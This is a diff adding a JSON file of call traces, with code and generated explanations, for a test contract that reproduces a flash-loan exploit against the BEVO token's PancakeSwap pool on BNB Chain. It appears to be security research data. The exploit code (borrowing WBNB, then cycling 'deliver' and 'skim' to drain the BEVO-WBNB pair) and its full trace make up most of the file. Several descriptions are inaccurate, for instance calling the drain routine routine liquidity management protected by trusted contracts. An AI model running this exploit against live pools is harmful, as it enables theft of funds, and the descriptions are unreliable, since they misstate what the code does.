@@ -1,0 +1,382 @@
+{
+  "logs": {
+    "calls": [
+      {
+        "id": "23756",
+        "contract": "ExploitScript",
+        "function": "testExploit",
+        "args": "",
+        "original_code": "    function testExploit() external {\n        // flashloan WBNB from PancakePair\n        wbnb.approve(address(router), type(uint256).max);\n        wbnb_usdc.swap(0, 192.5 ether, address(this), new bytes(1));\n        emit log_named_decimal_uint(\"WBNB balance after exploit\", wbnb.balanceOf(address(this)), 18);\n    }\n\n",
+        "description": "1. Core functions:  \nThe `testExploit` function is designed to simulate a specific action involving a flash loan. It interacts with a decentralized exchange (likely PancakeSwap) to borrow a large amount of WBNB (Wrapped Binance Coin) and then swaps it for another token (likely USDC). The function also logs the remaining WBNB balance after the exploit is executed.\n\n2. Security mechanism:  \nThe function uses the `approve` method to grant the router contract unlimited access to the WBNB tokens held by the caller. This is a common step in decentralized finance (DeFi) transactions to allow smart contracts to move tokens on behalf of the user. However, granting unlimited approval (`type(uint256).max`) can be risky if the router contract is compromised. The function does not include additional security checks or modifiers, which could expose it to vulnerabilities if not used carefully.\n\n3. Parameter Function:  \nThe `swap` function takes four parameters:  \n- `0`: This likely represents the minimum amount of tokens expected to be received from the swap. Setting it to 0 means no minimum is enforced, which could lead to unfavorable swap rates.  \n- `192.5 ether`: This is the amount of WBNB being swapped. The `ether` keyword indicates the value is in Wei (the smallest unit of Ether), so this represents 192.5 WBNB.  \n- `address(this)`: This specifies the recipient of the swapped tokens, which is the contract itself.  \n- `new bytes(1)`: This is an empty byte array, often used as a placeholder for additional data in swap functions.  \n\n4. Return description:  \nThe function does not return any value directly. Instead, it emits an event (`log_named_decimal_uint`) that logs the WBNB balance of the contract after the exploit. The balance is calculated by calling `wbnb.balanceOf(address(this))`, which retrieves the current WBNB holdings of the contract. The value is formatted as a decimal with 18 decimal places, which is standard for ERC-20 tokens like WBNB.  \n\nIn summary,  \nThe `testExploit` function demonstrates a flash loan and swap operation using WBNB and USDC. It grants unlimited approval to a router contract, performs a swap, and logs the resulting WBNB balance. While functional, the lack of security measures and the use of unlimited approval could introduce risks if not handled carefully.",
+        "return_value": "Returned",
+        "depth": 0,
+        "internal_calls": [
+          {
+            "id": "0",
+            "contract": "VM",
+            "function": "deal",
+            "value": null,
+            "args": "ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0",
+            "return_value": "Returned",
+            "depth": 1,
+            "internal_calls": []
+          }
+        ]
+      },
+      {
+        "id": "445652",
+        "contract": "BEVOExploit",
+        "function": "testExploit",
+        "args": "",
+        "flag": 1,
+        "return_value": "Returned",
+        "depth": 0,
+        "internal_calls": [
+          {
+            "id": "24420",
+            "contract": "WBNB",
+            "function": "approve",
+            "args": "PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+            "original_code": "    function approve(address spender, uint value) external returns (bool) {\n        _approve(msg.sender, spender, value);\n        return true;\n    }\n\n",
+            "description": "1. **Core functions**:  \n   The `approve` function allows the owner of tokens (the caller) to authorize another address (the `spender`) to spend a specific amount of tokens (`value`) on their behalf. This is a common feature in token contracts to enable delegated spending.\n\n2. **Security mechanism**:  \n   - The function uses the `external` modifier, meaning it can only be called from outside the contract, ensuring it cannot be invoked internally.  \n   - It relies on the `_approve` internal function, which handles the actual logic of setting the allowance. This separation helps maintain security by centralizing the approval logic.  \n   - The function does not include additional checks (e.g., for zero addresses or overflow), so these would need to be handled in the `_approve` function or elsewhere in the contract.  \n\n3. **Parameter Function**:  \n   - `spender`: The address of the account that is being authorized to spend tokens.  \n   - `value`: The maximum amount of tokens the `spender` is allowed to spend on behalf of the caller.  \n\n4. **Return description**:  \n   The function always returns `true` to indicate that the approval was successful. This is a standard practice in ERC-20 token contracts to confirm the operation completed as expected.  \n\n**In summary**, the `approve` function enables token owners to delegate spending authority to another address, ensuring secure and controlled token transfers. It uses a straightforward design with a focus on external interaction and relies on internal logic for the actual approval process.",
+            "return_value": "true",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "409813",
+            "contract": "PancakePair: WBNB-USDC",
+            "function": "swap",
+            "value": null,
+            "args": "0, 192500000000000000000 [1.925e20], BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00",
+            "return_value": "Returned",
+            "depth": 1,
+            "internal_calls": [
+              {
+                "id": "29962",
+                "contract": "WBNB",
+                "function": "transfer",
+                "args": "BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 192500000000000000000 [1.925e20]",
+                "original_code": "    function transfer(address to, uint value) external returns (bool) {\n        _transfer(msg.sender, to, value);\n        return true;\n    }\n\n    function transferFrom(address from, address to, uint value) external returns (bool) {\n        if (allowance[from][msg.sender] != uint(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n",
+                "description": "1. **Core functions:**  \n   - The `transfer` function allows the sender to move a specified amount of tokens to another address. It directly calls an internal `_transfer` function to handle the actual transfer.  \n   - The `transferFrom` function enables a third party (like a smart contract) to transfer tokens on behalf of the token owner, provided the owner has approved the third party to do so. It checks and updates the approved allowance before performing the transfer.  \n\n2. **Security mechanism:**  \n   - Both functions are marked as `external`, meaning they can only be called from outside the contract, ensuring internal logic is not bypassed.  \n   - The `transferFrom` function includes a check to ensure the caller has sufficient allowance to transfer the specified amount. If the allowance is not unlimited (represented by `uint(-1)`), it reduces the allowance by the transferred amount to prevent over-spending.  \n\n3. **Parameter Function:**  \n   - For `transfer`:  \n     - `to`: The address receiving the tokens.  \n     - `value`: The amount of tokens to be transferred.  \n   - For `transferFrom`:  \n     - `from`: The address from which tokens are being transferred.  \n     - `to`: The address receiving the tokens.  \n     - `value`: The amount of tokens to be transferred.  \n\n4. **Return description:**  \n   - Both functions return `true` to indicate the transfer was successful. This is a standard practice in token contracts to confirm the operation completed without errors.  \n\nIn summary, these functions handle token transfers directly or via approved third parties, ensuring proper checks and balances are in place to maintain security and accuracy.",
+                "return_value": "true",
+                "depth": 2,
+                "internal_calls": []
+              },
+              {
+                "id": "331144",
+                "contract": "BEVOExploit",
+                "function": "pancakeCall",
+                "args": "BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 192500000000000000000 [1.925e20], 0x00",
+                "original_code": "    function pancakeCall(\n        address, /*sender*/\n        uint256, /*amount0*/\n        uint256, /*amount1*/\n        bytes calldata /*data*/\n    ) external {\n        address[] memory path = new address[](2);\n        path[0] = address(wbnb);\n        path[1] = address(bevo);\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            wbnb.balanceOf(address(this)), 0, path, address(this), block.timestamp\n        );\n\n        bevo.deliver(bevo.balanceOf(address(this)));\n        bevo_wbnb.skim(address(this));\n        bevo.deliver(bevo.balanceOf(address(this)));\n        bevo_wbnb.swap(337 ether, 0, address(this), \"\");\n\n        wbnb.transfer(address(wbnb_usdc), 193 ether);\n    }\n",
+                "description": "1. Core functions:  \nThis function is designed to handle a specific type of transaction involving token swaps and transfers. It first swaps one type of token (WBNB) for another (BEVO) using a decentralized exchange router. After the swap, it performs additional operations like delivering BEVO tokens, adjusting liquidity in a token pair, and transferring WBNB tokens to another address. The function is likely part of a larger system that automates trading or liquidity management.\n\n2. Security mechanism:  \nThe function uses the `external` modifier, which restricts its access to external calls only, preventing internal misuse. It also relies on the `block.timestamp` to set a deadline for the swap transaction, ensuring the operation is executed within a specific time frame. Additionally, the function interacts with trusted contracts (e.g., `router`, `wbnb`, `bevo`), assuming they are secure and properly implemented.\n\n3. Parameter Function:  \nThe function takes four parameters, but none are used directly within the function. They are likely placeholders for compatibility with a specific interface or callback mechanism. The parameters include:  \n- `address`: Represents the sender of the transaction (unused).  \n- `uint256`: Represents the amount of the first token involved (unused).  \n- `uint256`: Represents the amount of the second token involved (unused).  \n- `bytes`: Represents additional data (unused).  \n\n4. Return description:  \nThe function does not return any value. Instead, it performs a series of actions: swapping tokens, delivering tokens, adjusting liquidity, and transferring tokens. These actions modify the state of the blockchain but do not produce a direct output.  \n\nIn summary, this function automates a sequence of token swaps and transfers, ensuring compatibility with external systems while relying on trusted contracts and time-based constraints for security.",
+                "return_value": "Returned",
+                "depth": 2,
+                "internal_calls": [
+                  {
+                    "id": "534",
+                    "contract": "WBNB",
+                    "function": "balanceOf",
+                    "args": "BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+                    "original_code": "    function balanceOf(address account) public view override returns (uint256) {\n        if (_isExcluded[account]) return _tOwned[account];\n        return tokenFromReflection(_rOwned[account]);\n    }\n\n",
+                    "description": "1. **Core functions:**  \n   This function is designed to check the token balance of a specific account. It first checks if the account is excluded from certain features (like rewards or fees). If the account is excluded, it directly returns the balance stored in `_tOwned`. If not, it calculates the balance by converting the reflected balance (`_rOwned`) into actual tokens using the `tokenFromReflection` function.\n\n2. **Security mechanism:**  \n   The function uses the `public view` modifier, which means it can be called by anyone but does not modify the state of the contract. The `override` keyword indicates that this function is overriding a function from a parent contract, ensuring consistency with the inherited interface. These modifiers help maintain security by restricting the function to read-only access and ensuring it adheres to the expected behavior.\n\n3. **Parameter Function:**  \n   The function takes one parameter, `account`, which is the address of the user whose balance is being checked. This parameter is essential because it specifies which account’s balance the function should retrieve or calculate.\n\n4. **Return description:**  \n   The function returns a `uint256` value representing the token balance of the specified account. If the account is excluded, it directly returns the value from `_tOwned`. If not, it calculates the balance by converting the reflected balance (`_rOwned`) into actual tokens using the `tokenFromReflection` function. This ensures the returned balance is accurate based on the account’s status.\n\nIn summary, this function checks the token balance of a given account, handles excluded accounts differently, and ensures the balance is calculated correctly using reflection mechanics. It is secure, read-only, and adheres to the contract’s inherited interface.",
+                    "return_value": "192500000000000000000 [1.925e20]",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "191226",
+                    "contract": "PancakeRouter",
+                    "function": "swapExactTokensForTokensSupportingFeeOnTransferTokens",
+                    "value": null,
+                    "args": "192500000000000000000 [1.925e20], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xc6Cb12df4520B7Bf83f64C79c585b8462e18B6Aa], BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1675071422 [1.675e9]",
+                    "return_value": "Returned",
+                    "depth": 3,
+                    "internal_calls": [
+                      {
+                        "id": "8225",
+                        "contract": "WBNB",
+                        "function": "transferFrom",
+                        "args": "BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], PancakePair: BEVO-WBNB: [0xA6eB184a4b8881C0a4F7F12bBF682FD31De7a633], 192500000000000000000 [1.925e20]",
+                        "original_code": "    function transferFrom(address from, address to, uint value) external returns (bool) {\n        if (allowance[from][msg.sender] != uint(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n",
+                        "description": "1. **Core functions:**  \n   The main purpose of this function is to transfer a specified amount of tokens from one address (`from`) to another address (`to`). It ensures that the sender (`msg.sender`) has been approved to spend the tokens on behalf of the `from` address. If the approval is not unlimited, it reduces the approved amount by the transferred value. Finally, it executes the actual transfer of tokens.\n\n2. **Security mechanism:**  \n   - The function checks if the sender (`msg.sender`) has an unlimited allowance (`uint(-1)`). If not, it reduces the allowance by the transferred value to prevent overspending.  \n   - It uses the `sub` function to safely subtract the transferred value from the allowance, ensuring no underflow occurs.  \n   - The `external` modifier restricts the function to be called only from outside the contract, adding a layer of access control.  \n\n3. **Parameter Function:**  \n   - `from`: The address from which tokens are being transferred.  \n   - `to`: The address receiving the tokens.  \n   - `value`: The amount of tokens to be transferred.  \n\n4. **Return description:**  \n   The function always returns `true` to indicate that the transfer was successful. This is a standard practice in such functions to confirm the operation's completion.  \n\n**In summary,**  \nThis function securely transfers tokens from one address to another, ensuring the sender has the necessary approval. It adjusts the allowance if it’s not unlimited and confirms the transfer by returning `true`.",
+                        "return_value": "true",
+                        "depth": 4,
+                        "internal_calls": []
+                      },
+                      {
+                        "id": "21177",
+                        "contract": "BEVO",
+                        "function": "balanceOf",
+                        "args": "BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+                        "flag": 1,
+                        "return_value": "0",
+                        "depth": 4,
+                        "internal_calls": []
+                      },
+                      {
+                        "id": "2893",
+                        "contract": "PancakePair: BEVO-WBNB",
+                        "function": "getReserves",
+                        "value": null,
+                        "args": "",
+                        "return_value": "145721197780523651391 [1.457e20], 5327282266398899539 [5.327e18], 1673083038 [1.673e9]",
+                        "depth": 4,
+                        "internal_calls": []
+                      },
+                      {
+                        "id": "534",
+                        "contract": "WBNB",
+                        "function": "balanceOf",
+                        "args": "PancakePair: BEVO-WBNB: [0xA6eB184a4b8881C0a4F7F12bBF682FD31De7a633]",
+                        "flag": 1,
+                        "return_value": "338221197780523651391 [3.382e20]",
+                        "depth": 4,
+                        "internal_calls": []
+                      },
+                      {
+                        "id": "141078",
+                        "contract": "PancakePair: BEVO-WBNB",
+                        "function": "swap",
+                        "value": null,
+                        "args": "0, 3028774323006137313 [3.028e18], BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+                        "return_value": "Returned",
+                        "depth": 4,
+                        "internal_calls": [
+                          {
+                            "id": "102047",
+                            "contract": "BEVO",
+                            "function": "transfer",
+                            "args": "BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3028774323006137313 [3.028e18]",
+                            "flag": 1,
+                            "return_value": "true",
+                            "depth": 5,
+                            "internal_calls": []
+                          },
+                          {
+                            "id": "534",
+                            "contract": "WBNB",
+                            "function": "balanceOf",
+                            "args": "PancakePair: BEVO-WBNB: [0xA6eB184a4b8881C0a4F7F12bBF682FD31De7a633]",
+                            "flag": 1,
+                            "return_value": "338221197780523651391 [3.382e20]",
+                            "depth": 5,
+                            "internal_calls": []
+                          },
+                          {
+                            "id": "5177",
+                            "contract": "BEVO",
+                            "function": "balanceOf",
+                            "args": "PancakePair: BEVO-WBNB: [0xA6eB184a4b8881C0a4F7F12bBF682FD31De7a633]",
+                            "flag": 1,
+                            "return_value": "2298813336114922094 [2.298e18]",
+                            "depth": 5,
+                            "internal_calls": []
+                          }
+                        ]
+                      },
+                      {
+                        "id": "5177",
+                        "contract": "BEVO",
+                        "function": "balanceOf",
+                        "args": "BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+                        "flag": 1,
+                        "return_value": "3028267986646483923 [3.028e18]",
+                        "depth": 4,
+                        "internal_calls": []
+                      }
+                    ]
+                  },
+                  {
+                    "id": "5177",
+                    "contract": "BEVO",
+                    "function": "balanceOf",
+                    "args": "BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+                    "flag": 1,
+                    "return_value": "3028267986646483923 [3.028e18]",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "11609",
+                    "contract": "BEVO",
+                    "function": "deliver",
+                    "args": "3028267986646483923 [3.028e18]",
+                    "original_code": "    function deliver(uint256 tAmount) public {\n        address sender = _msgSender();\n",
+                    "description": "1. Core functions:\n   The `deliver` function is designed to process a specific amount of tokens (represented by `tAmount`) and perform an action related to these tokens. The function retrieves the address of the person or entity calling the function (referred to as `sender`) and likely uses this information to manage or transfer the tokens in some way.\n\n2. Security mechanism:\n   The function uses `_msgSender()` to securely identify the caller. This is a common practice in Solidity to ensure that the function interacts with the correct address, especially in scenarios where the function might be called indirectly (e.g., through another contract). This helps prevent unauthorized access or manipulation of the function.\n\n3. Parameter Function:\n   The function takes one parameter, `tAmount`, which represents the amount of tokens to be processed. This parameter is crucial as it determines the quantity of tokens that the function will handle, influencing the subsequent actions or calculations within the function.\n\n4. Return description:\n   The function does not explicitly return any value. Instead, it focuses on processing the `tAmount` of tokens and likely performs internal operations such as updating balances, triggering events, or executing other token-related logic.\n\nIn summary, the `deliver` function is a straightforward utility that processes a specified amount of tokens by identifying the caller and performing necessary actions based on the token amount provided. It employs a secure method to identify the caller and does not return any value, focusing instead on internal token management.",
+                    "return_value": "Returned",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "48187",
+                    "contract": "PancakePair: BEVO-WBNB",
+                    "function": "skim",
+                    "value": null,
+                    "args": "BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+                    "return_value": "Returned",
+                    "depth": 3,
+                    "internal_calls": [
+                      {
+                        "id": "534",
+                        "contract": "WBNB",
+                        "function": "balanceOf",
+                        "args": "PancakePair: BEVO-WBNB: [0xA6eB184a4b8881C0a4F7F12bBF682FD31De7a633]",
+                        "flag": 1,
+                        "return_value": "338221197780523651391 [3.382e20]",
+                        "depth": 4,
+                        "internal_calls": []
+                      },
+                      {
+                        "id": "3262",
+                        "contract": "WBNB",
+                        "function": "transfer",
+                        "args": "BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0",
+                        "flag": 1,
+                        "return_value": "true",
+                        "depth": 4,
+                        "internal_calls": []
+                      },
+                      {
+                        "id": "5177",
+                        "contract": "BEVO",
+                        "function": "balanceOf",
+                        "args": "PancakePair: BEVO-WBNB: [0xA6eB184a4b8881C0a4F7F12bBF682FD31De7a633]",
+                        "flag": 1,
+                        "return_value": "6844218532359160336 [6.844e18]",
+                        "depth": 4,
+                        "internal_calls": []
+                      },
+                      {
+                        "id": "31747",
+                        "contract": "BEVO",
+                        "function": "transfer",
+                        "args": "BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4545405196244238242 [4.545e18]",
+                        "flag": 1,
+                        "return_value": "true",
+                        "depth": 4,
+                        "internal_calls": []
+                      }
+                    ]
+                  },
+                  {
+                    "id": "5177",
+                    "contract": "BEVO",
+                    "function": "balanceOf",
+                    "args": "BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+                    "flag": 1,
+                    "return_value": "4544947785463603859 [4.544e18]",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "11609",
+                    "contract": "BEVO",
+                    "function": "deliver",
+                    "args": "4544947785463603859 [4.544e18]",
+                    "flag": 1,
+                    "return_value": "Returned",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "42901",
+                    "contract": "PancakePair: BEVO-WBNB",
+                    "function": "swap",
+                    "value": null,
+                    "args": "337000000000000000000 [3.37e20], 0, BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+                    "return_value": "Returned",
+                    "depth": 3,
+                    "internal_calls": [
+                      {
+                        "id": "23162",
+                        "contract": "WBNB",
+                        "function": "transfer",
+                        "args": "BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 337000000000000000000 [3.37e20]",
+                        "flag": 1,
+                        "return_value": "true",
+                        "depth": 4,
+                        "internal_calls": []
+                      },
+                      {
+                        "id": "534",
+                        "contract": "WBNB",
+                        "function": "balanceOf",
+                        "args": "PancakePair: BEVO-WBNB: [0xA6eB184a4b8881C0a4F7F12bBF682FD31De7a633]",
+                        "flag": 1,
+                        "return_value": "1221197780523651391 [1.221e18]",
+                        "depth": 4,
+                        "internal_calls": []
+                      },
+                      {
+                        "id": "5177",
+                        "contract": "BEVO",
+                        "function": "balanceOf",
+                        "args": "PancakePair: BEVO-WBNB: [0xA6eB184a4b8881C0a4F7F12bBF682FD31De7a633]",
+                        "flag": 1,
+                        "return_value": "728234950164515176689 [7.282e20]",
+                        "depth": 4,
+                        "internal_calls": []
+                      }
+                    ]
+                  },
+                  {
+                    "id": "3262",
+                    "contract": "WBNB",
+                    "function": "transfer",
+                    "args": "PancakePair: WBNB-USDC: [0xd99c7F6C65857AC913a8f880A4cb84032AB2FC5b], 193000000000000000000 [1.93e20]",
+                    "flag": 1,
+                    "return_value": "true",
+                    "depth": 3,
+                    "internal_calls": []
+                  }
+                ]
+              },
+              {
+                "id": "9796",
+                "contract": "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
+                "function": "balanceOf",
+                "args": "PancakePair: WBNB-USDC: [0xd99c7F6C65857AC913a8f880A4cb84032AB2FC5b]",
+                "flag": 1,
+                "return_value": "2419698099143706937273612 [2.419e24]",
+                "depth": 2,
+                "internal_calls": [
+                  {
+                    "id": "2553",
+                    "contract": "0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C",
+                    "function": "balanceOf",
+                    "args": "PancakePair: WBNB-USDC: [0xd99c7F6C65857AC913a8f880A4cb84032AB2FC5b]",
+                    "flag": 1,
+                    "return_value": "2419698099143706937273612 [2.419e24]",
+                    "depth": 3,
+                    "internal_calls": []
+                  }
+                ]
+              },
+              {
+                "id": "534",
+                "contract": "WBNB",
+                "function": "balanceOf",
+                "args": "PancakePair: WBNB-USDC: [0xd99c7F6C65857AC913a8f880A4cb84032AB2FC5b]",
+                "flag": 1,
+                "return_value": "7860111160946076447840 [7.86e21]",
+                "depth": 2,
+                "internal_calls": []
+              }
+            ]
+          },
+          {
+            "id": "534",
+            "contract": "WBNB",
+            "function": "balanceOf",
+            "args": "BEVOExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+            "flag": 1,
+            "return_value": "144000000000000000000 [1.44e20]",
+            "depth": 1,
+            "internal_calls": []
+          }
+        ]
+      }
+    ]
+  }
+}
